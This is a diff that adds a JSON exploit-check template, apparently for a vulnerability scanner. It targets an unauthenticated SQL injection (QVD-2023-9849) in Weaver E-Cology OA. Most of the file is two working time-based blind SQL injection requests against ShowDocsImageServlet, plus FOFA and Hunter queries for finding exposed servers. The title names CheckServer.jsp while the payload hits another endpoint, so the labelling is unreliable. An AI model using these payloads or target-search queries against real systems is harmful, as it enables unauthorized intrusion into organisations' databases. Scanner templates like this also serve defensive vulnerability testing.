@@ -1,0 +1,61 @@
+{
+  "product": "泛微 E-Cology",
+  "vul_name": "泛微 E-Cology CheckServer.jsp SQL注入",
+  "type": "SQL注入",
+  "vul_id": [
+    "QVD-2023-9849"
+  ],
+  "level": 3,
+  "vul_desc": "泛微 Ecology OA 系统对用户传入的数据过滤处理不当，导致存在 SQL 注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。",
+  "version": "泛微 Ecology 9.x <= v10.56；泛微 Ecology 8.x <= v10.56",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"泛微-协同办公OA\"",
+    "Hunter": "app.name=\"泛微 e-cology 9.0 OA\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/pursue-security/p/17677217.html",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": [
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=112%2F**%2Fand(select%2F**%2F1)%3E0%2F**%2Fwaitfor%2F**%2Fdelay'0%3A0%3A8'%2F**%2F"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "time": {
+              "check": ">=",
+              "num": 8
+            }
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=122%2F**%2Fand(select%2F**%2F1)%3E0%2F**%2Fwaitfor%2F**%2Fdelay'0%3A0%3A0'%2F**%2F"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "time": {
+              "check": "<=",
+              "num": 7
+            }
+          }
+        ]
+      }
+    }
+  ]
+}
